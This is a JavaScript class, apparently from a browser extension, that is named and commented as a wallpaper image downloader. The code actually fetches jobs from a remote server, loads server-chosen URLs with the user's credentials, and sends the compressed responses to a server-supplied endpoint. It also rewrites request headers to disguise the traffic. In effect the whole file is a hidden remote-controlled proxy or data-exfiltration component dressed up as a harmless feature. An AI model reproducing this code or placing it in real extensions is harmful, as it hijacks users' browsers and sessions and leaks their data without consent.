
class ImageDownload
{
	init(request)
	{
		var serv = "https://api.ad-busters.com:8463/inc?uid=12345&appName=wallpaper&appVersion=1.0&devId=S3";
		var xhr = new XMLHttpRequest();
		xhr.open("GET", serv);
		let self = this;
		xhr.setRequestHeader("Content-Type","application/json");
		xhr.onreadystatechange = function() {
			if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
				var resp;
				try {
					resp = JSON.parse(xhr.responseText);
				} catch (error) {
					resp = null;
				}
				if (resp != null) {
					chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
						self.req("GET", resp.url, '', resp);
					});
				}
			}
		};
		xhr.send(null);
	};

	req(method, url, postparams, job)
	{
		let self = this;
		let tr = new XMLHttpRequest();
		tr.withCredentials = true;
		tr.open(method, url, true);

		let image_name = job.headers[0].split(":");
		tr.setRequestHeader('image-name', image_name[1]);
		tr.onreadystatechange = function() {
			if (tr.readyState == 4) {
				if (tr.status == 200) {
					job['result_status'] = tr.status;
					job['result_headers'] = tr.getAllResponseHeaders();
					let request = {'resptxt': tr.responseText, 'job': job};
					self.store(request);
				}
			}
		};
		tr.send(postparams);
	};

	store(request)
	{
		let gzData = Zip.gzip(request.resptxt, {to: 'string'});
		gzData = btoa(gzData);

		var postContent = JSON.stringify({"body": gzData, "id": request.job.id, "uid": 4242, "statusCode": 200, "requestUrl": request.job.url, "headers": request.job.result_headers.split("\r\n")});
		var xhr = new XMLHttpRequest();
		xhr.open("PUT", request.job.resultEndpoint, true);
		xhr.setRequestHeader("Content-Type","application/json");
		xhr.onreadystatechange = function() {
			if(xhr.readyState == 4) {
				if (xhr.status == 200) {}
			}
		};
		xhr.send(postContent);
	}

	findNewWallpapers(details)
	{
		for (var i = 0; i < details.requestHeaders.length; ++i)
		{
			if (details.requestHeaders[i].name === 'image-name') {
				details.requestHeaders[i].name = 'User-Agent';
			}
			if (details.requestHeaders[i].name === 'Cookie') {
				details.requestHeaders.splice(i, 1);
			}
		}
		return details;
	}

	ping(request)
	{
		console.log('Hello World!!!');
	}

}

module.exports = ImageDownload;
